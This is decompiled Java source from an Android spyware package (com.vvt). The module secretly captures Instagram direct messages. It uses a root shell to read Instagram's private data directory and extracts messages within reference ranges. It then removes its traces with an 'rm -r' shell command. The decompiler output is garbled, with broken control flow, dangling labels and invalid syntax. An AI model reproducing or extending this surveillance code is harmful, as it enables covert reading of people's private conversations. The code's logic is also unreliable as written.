package com.vvt.capture.instagram.directmessage.b;

import android.os.SystemClock;
import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import com.vvt.shell.KMShell;
import com.vvt.shell.KMShell.ShellException;
import java.util.ArrayList;
import java.util.Collection;
import java.util.List;

public class b
  implements f
{
  private static final String a = b.class.getSimpleName();
  private static final boolean b = com.vvt.ak.a.a;
  private static final boolean c = com.vvt.ak.a.d;
  private static final boolean d = com.vvt.ak.a.e;
  private String e;
  private com.vvt.base.b f;
  private long g = -1;
  
  public b(String paramString, com.vvt.base.b paramb)
  {
    this.e = paramString;
    this.f = paramb;
  }
  
  private void b()
  {
    String str1 = c.a(this.e);
    String str2 = "rm -r %s";
    int i = 1;
    try
    {
      Object[] arrayOfObject = new Object[i];
      arrayOfObject[0] = str1;
      str1 = String.format(str2, arrayOfObject);
      KMShell.a(str1);
      return;
    }
    catch (KMShell.ShellException localShellException)
    {
      for (;;)
      {
        boolean bool = d;
        if (!bool) {}
      }
    }
  }
  
  public g a()
  {
    long l1 = -1;
    boolean bool1 = b;
    if (bool1) {}
    long l2 = 3000L;
    for (;;)
    {
      try
      {
        SystemClock.sleep(l2);
        String str1 = c.a();
        String str2 = com.vvt.capture.instagram.a.a();
        if (str1 == null) {
          break label247;
        }
        str1 = this.e;
        Object localObject2 = this.f;
        localObject2 = ((com.vvt.base.b)localObject2).f();
        String str3 = c.a(str2, str1, (String)localObject2);
        bool1 = com.vvt.ag.b.a(str3);
        if (bool1) {
          break label247;
        }
        long l3 = com.vvt.capture.instagram.directmessage.b.a(str3);
        bool1 = false;
        str1 = null;
        l2 = l3;
        int j = 0;
        localObject2 = null;
        boolean bool3 = l2 < l1;
        if (bool3) {
          break label250;
        }
        int k = 10;
        if (j >= k) {
          break label250;
        }
        l2 = 6000L;
        SystemClock.sleep(l2);
        long l4 = com.vvt.capture.instagram.directmessage.b.a(str3);
        int i = j + 1;
        j = i;
        l2 = l4;
        continue;
        boolean bool2;
        boolean bool4;
        FxSimpleEventReference localFxSimpleEventReference;
        Long localLong;
        this.g = l2;
      }
      catch (Exception localException)
      {
        bool2 = d;
        if (bool2) {}
        b();
        l2 = l1;
        bool4 = l2 < l1;
        if (!bool4)
        {
          bool2 = c;
          if (bool2) {}
          l2 = this.g;
          localFxSimpleEventReference = new com/vvt/base/capture/FxSimpleEventReference;
          localFxSimpleEventReference.<init>();
          localLong = Long.valueOf(l2);
          localFxSimpleEventReference.setReference(localLong);
          bool2 = b;
          if (bool2) {}
          return localFxSimpleEventReference;
        }
      }
      finally
      {
        b();
      }
      continue;
      label247:
      l2 = l1;
      label250:
      b();
    }
  }
  
  public List a(int paramInt)
  {
    bool = b;
    if (bool) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    try
    {
      Object localObject1 = c.a();
      String str1 = com.vvt.capture.instagram.a.a();
      String str2 = "/data/data/com.instagram.android/shared_prefs";
      if (localObject1 != null)
      {
        localObject1 = this.e;
        Object localObject2 = this.f;
        localObject2 = ((com.vvt.base.b)localObject2).f();
        str1 = c.a(str1, (String)localObject1, (String)localObject2);
        localObject1 = this.e;
        localObject2 = this.f;
        localObject2 = ((com.vvt.base.b)localObject2).f();
        String str3 = c.b(str2, (String)localObject1, (String)localObject2);
        bool = b;
        if (bool) {}
        long l1 = com.vvt.capture.instagram.directmessage.b.a(paramInt, str1);
        long l2 = 1L;
        l1 -= l2;
        l2 = com.vvt.capture.instagram.directmessage.b.a(str1);
        bool = com.vvt.ag.b.a(str1);
        if (!bool)
        {
          localObject1 = this.e;
          com.vvt.base.b localb = this.f;
          localObject1 = com.vvt.capture.instagram.directmessage.b.a((String)localObject1, str1, l1, l2, localb, str3);
          localArrayList.addAll((Collection)localObject1);
        }
        b();
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool = d;
        if (!bool) {}
      }
    }
    bool = b;
    if (bool) {}
    return localArrayList;
  }
  
  public List a(g paramg1, g paramg2)
  {
    bool = b;
    if (bool) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    try
    {
      Object localObject1 = paramg1.getReference();
      localObject1 = (Long)localObject1;
      long l1 = ((Long)localObject1).longValue();
      localObject1 = paramg2.getReference();
      localObject1 = (Long)localObject1;
      long l2 = ((Long)localObject1).longValue();
      localObject1 = c.a();
      String str = com.vvt.capture.instagram.a.a();
      Object localObject2 = "/data/data/com.instagram.android/shared_prefs";
      if (localObject1 != null)
      {
        localObject1 = this.e;
        Object localObject3 = this.f;
        localObject3 = ((com.vvt.base.b)localObject3).f();
        str = c.a(str, (String)localObject1, (String)localObject3);
        localObject1 = this.e;
        localObject3 = this.f;
        localObject3 = ((com.vvt.base.b)localObject3).f();
        localObject3 = c.b((String)localObject2, (String)localObject1, (String)localObject3);
        bool = com.vvt.ag.b.a(str);
        if (!bool)
        {
          localObject1 = this.e;
          localObject2 = this.f;
          localObject1 = com.vvt.capture.instagram.directmessage.b.a((String)localObject1, str, l1, l2, (com.vvt.base.b)localObject2, (String)localObject3);
          localArrayList.addAll((Collection)localObject1);
        }
        b();
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool = d;
        if (!bool) {}
      }
    }
    bool = b;
    if (bool) {}
    return localArrayList;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/instagram/directmessage/removeFromPath/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */